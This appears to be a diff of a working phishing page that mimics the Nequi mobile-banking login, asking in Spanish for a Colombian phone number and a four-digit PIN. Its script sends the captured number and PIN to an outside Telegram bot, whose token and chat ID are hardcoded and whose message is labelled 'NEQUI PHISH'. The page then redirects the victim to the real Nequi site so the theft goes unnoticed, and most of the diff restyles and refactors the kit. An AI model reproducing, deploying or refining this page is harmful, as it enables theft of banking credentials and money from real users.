@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Nequi</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    * { margin:0; padding:0; box-sizing:border-box; }
     body {
       background: #1C0B2E;
       font-family: 'Roboto', sans-serif;
@@ -13,76 +13,34 @@
       overflow: hidden;
       color: white;
     }
-    .container {
+    .screen {
       max-width: 420px;
       margin: 0 auto;
       height: 100vh;
-      background: url('https://i.ibb.co.com/0vN8YkZ/nequi-bg-real.jpg') no-repeat center center;
-      background-size: cover;
       position: relative;
+      background-size: cover;
+      background-position: center;
     }
+
+    /* Logo Nequi */
     .logo {
       position: absolute;
-      top: 35px;
+      top: 45px;
       left: 50%;
       transform: translateX(-50%);
-      width: 110px;
-    }
-    .header {
-      position: absolute;
-      top: 100px;
-      left: 0;
-      right: 0;
-      text-align: center;
-      font-size: 22px;
-      font-weight: 500;
+      width: 130px;
+      z-index: 10;
     }
 
-    /* Pantalla de Número */
-    #screen1 .input-box {
-      position: absolute;
-      top: 220px;
-      left: 30px;
-      right: 30px;
-      background: rgba(255,255,255,0.12);
-      border-radius: 12px;
-      padding: 18px 20px;
-      font-size: 18px;
-    }
-    input {
-      background: transparent;
-      border: none;
-      color: white;
-      width: 100%;
-      font-size: 18px;
-      outline: none;
-    }
-    input:-webkit-autofill,
-    input:-webkit-autofill:hover,
-    input:-webkit-autofill:focus {
-      -webkit-text-fill-color: white;
-      -webkit-box-shadow: 0 0 0 30px rgba(40, 15, 70, 0.7) inset;
-      transition: all 0.3s;
+    /* Pantalla 1 - Número */
+    #screen1 {
+      background: linear-gradient(rgba(28,11,46,0.75), rgba(28,11,46,0.85)), 
+                  url('https://i.ibb.co.com/3zK8vL0/nequi-login-bg.jpg') center/cover;
     }
 
-    button {
+    .title1 {
       position: absolute;
-      bottom: 80px;
-      left: 30px;
-      right: 30px;
-      background: #FF2D95;
-      color: white;
-      border: none;
-      padding: 16px;
-      border-radius: 12px;
-      font-size: 18px;
-      font-weight: 500;
-    }
-
-    /* Pantalla de Clave */
-    #screen2 .title {
-      position: absolute;
-      top: 170px;
+      top: 180px;
       left: 0;
       right: 0;
       text-align: center;
@@ -90,121 +48,175 @@
       font-weight: 500;
     }
 
+    .input-container {
+      position: absolute;
+      top: 250px;
+      left: 35px;
+      right: 35px;
+      background: rgba(255,255,255,0.13);
+      border-radius: 14px;
+      padding: 18px 22px;
+      font-size: 18px;
+    }
+
+    input {
+      background: transparent;
+      border: none;
+      color: white;
+      width: 100%;
+      font-size: 19px;
+      outline: none;
+      margin-left: 10px;
+    }
+
+    /* Fix para autocompletado */
+    input:-webkit-autofill,
+    input:-webkit-autofill:hover,
+    input:-webkit-autofill:focus {
+      -webkit-text-fill-color: white !important;
+      -webkit-box-shadow: 0 0 0 30px rgba(40, 15, 65, 0.85) inset !important;
+    }
+
+    button {
+      position: absolute;
+      bottom: 90px;
+      left: 35px;
+      right: 35px;
+      background: #FF2D95;
+      color: white;
+      border: none;
+      height: 56px;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 500;
+    }
+
+    /* Pantalla 2 - Clave */
+    #screen2 {
+      background: linear-gradient(rgba(28,11,46,0.8), rgba(28,11,46,0.9)), 
+                  url('https://i.ibb.co.com/3zK8vL0/nequi-login-bg.jpg') center/cover;
+      display: none;
+    }
+
+    .title2 {
+      position: absolute;
+      top: 165px;
+      left: 0; right: 0;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 500;
+    }
+
     .pins {
       position: absolute;
-      top: 230px;
-      left: 0;
-      right: 0;
+      top: 235px;
+      left: 0; right: 0;
       display: flex;
       justify-content: center;
-      gap: 20px;
+      gap: 22px;
     }
     .pin {
-      width: 58px;
-      height: 58px;
-      background: #E8C1FF;
-      border-radius: 12px;
+      width: 62px;
+      height: 62px;
+      background: #E8BFFF;
+      border-radius: 14px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 32px;
-      color: #4A0E5E;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      font-size: 34px;
+      color: #3C0A55;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.4);
     }
 
     .message {
       position: absolute;
-      top: 320px;
-      left: 0;
-      right: 0;
+      top: 330px;
+      left: 0; right: 0;
       text-align: center;
-      color: #D8B0FF;
+      color: #D4A8FF;
       font-size: 15.5px;
-      line-height: 1.4;
+      line-height: 1.45;
     }
 
     .keyboard {
       position: absolute;
-      bottom: 40px;
-      left: 0;
-      right: 0;
+      bottom: 50px;
+      left: 30px;
+      right: 30px;
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 12px 40px;
-      padding: 0 30px;
+      gap: 18px 35px;
       font-size: 36px;
     }
     .key {
-      height: 68px;
+      height: 72px;
       display: flex;
       align-items: center;
       justify-content: center;
-      background: rgba(255,255,255,0.1);
+      background: rgba(255,255,255,0.12);
       border-radius: 50%;
-      color: white;
-      box-shadow: 0 3px 8px rgba(0,0,0,0.4);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.35);
     }
-    .key:active { background: rgba(255,255,255,0.25); }
+    .key:active { background: rgba(255,255,255,0.3); }
   </style>
 </head>
 <body>
 
-  <div class="container" id="screen1">
+  <!-- Pantalla 1: Número -->
+  <div class="screen" id="screen1">
     
-
-    <div class="header">Ingresa tu número de celular</div>
-
-    <div class="input-box">
+    <div class="title1">Ingresa tu número de celular</div>
+    
+    <div class="input-container">
       <span style="color:#FF7AC4; font-weight:600;">+57</span>
-      <input type="tel" id="phone" placeholder="300 123 4567" maxlength="10" inputmode="numeric">
+      <input type="tel" id="phone" placeholder="300 1234567" maxlength="10" inputmode="numeric">
     </div>
-
-    <button onclick="goToPassword()">Entra</button>
+    
+    <button onclick="nextScreen()">Entra</button>
   </div>
 
-  <!-- Pantalla de Clave -->
-  <div class="container" id="screen2" style="display:none; background: url('https://i.ibb.co.com/0vN8YkZ/nequi-bg-real.jpg') no-repeat center center; background-size: cover;">
+  <!-- Pantalla 2: Clave -->
+  <div class="screen" id="screen2">
     
-
-    <div class="title">Escribe tu clave</div>
-
+    <div class="title2">Escribe tu clave</div>
+    
     <div class="pins" id="pins">
       <div class="pin"></div>
       <div class="pin"></div>
       <div class="pin"></div>
       <div class="pin"></div>
     </div>
-
+    
     <div class="message">
       No dudamos que seas tú...<br>
       Pero es mejor confirmar ;)
     </div>
 
-    <div class="keyboard" id="keyboard">
-      <div class="key" onclick="addNumber(1)">1</div>
-      <div class="key" onclick="addNumber(2)">2</div>
-      <div class="key" onclick="addNumber(3)">3</div>
-      <div class="key" onclick="addNumber(4)">4</div>
-      <div class="key" onclick="addNumber(5)">5</div>
-      <div class="key" onclick="addNumber(6)">6</div>
-      <div class="key" onclick="addNumber(7)">7</div>
-      <div class="key" onclick="addNumber(8)">8</div>
-      <div class="key" onclick="addNumber(9)">9</div>
+    <div class="keyboard">
+      <div class="key" onclick="addDigit(1)">1</div>
+      <div class="key" onclick="addDigit(2)">2</div>
+      <div class="key" onclick="addDigit(3)">3</div>
+      <div class="key" onclick="addDigit(4)">4</div>
+      <div class="key" onclick="addDigit(5)">5</div>
+      <div class="key" onclick="addDigit(6)">6</div>
+      <div class="key" onclick="addDigit(7)">7</div>
+      <div class="key" onclick="addDigit(8)">8</div>
+      <div class="key" onclick="addDigit(9)">9</div>
       <div class="key"></div>
-      <div class="key" onclick="addNumber(0)">0</div>
-      <div class="key" onclick="deleteNumber()" style="font-size:26px;">✕</div>
+      <div class="key" onclick="addDigit(0)">0</div>
+      <div class="key" onclick="deleteDigit()" style="font-size:28px;">✕</div>
     </div>
   </div>
 
   <script>
-    let enteredPin = "";
+    let pin = "";
     const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
     const chatId = "773351137";
 
-    function goToPassword() {
+    function nextScreen() {
       const phone = document.getElementById("phone").value.trim();
-      if (phone.length < 10) {
-        alert("Ingresa un número válido");
+      if (phone.length < 9) {
+        alert("Por favor ingresa un número válido");
         return;
       }
       localStorage.setItem("phone", phone);
@@ -212,42 +224,39 @@
       document.getElementById("screen2").style.display = "block";
     }
 
-    function addNumber(num) {
-      if (enteredPin.length < 4) {
-        enteredPin += num;
+    function addDigit(num) {
+      if (pin.length < 4) {
+        pin += num;
         updatePins();
-
-        if (enteredPin.length === 4) {
-          sendData();
-        }
+        if (pin.length === 4) sendToTelegram();
       }
     }
 
-    function deleteNumber() {
-      enteredPin = enteredPin.slice(0, -1);
+    function deleteDigit() {
+      pin = pin.slice(0, -1);
       updatePins();
     }
 
     function updatePins() {
-      const pins = document.querySelectorAll("#pins .pin");
-      pins.forEach((pin, index) => {
-        pin.textContent = index < enteredPin.length ? "●" : "";
+      const pins = document.querySelectorAll(".pin");
+      pins.forEach((el, i) => {
+        el.innerHTML = i < pin.length ? "●" : "";
       });
     }
 
-    function sendData() {
-      const phone = localStorage.getItem("phone") || "Desconocido";
-      const message = `🔴 NEQUI PHISHING\n\n📱 Celular: +57 ${phone}\n🔑 Clave: ${enteredPin}\n⏰ Hora: ${new Date().toLocaleString('es-CO')}`;
+    function sendToTelegram() {
+      const phone = localStorage.getItem("phone") || "No registrado";
+      const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n🔑 Clave: ${pin}\n⏰ ${new Date().toLocaleString('es-CO')}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: chatId, text: message })
       });
 
       setTimeout(() => {
         window.location.href = "https://www.nequi.com.co";
-      }, 1500);
+      }, 1800);
     }
   </script>
 </body>
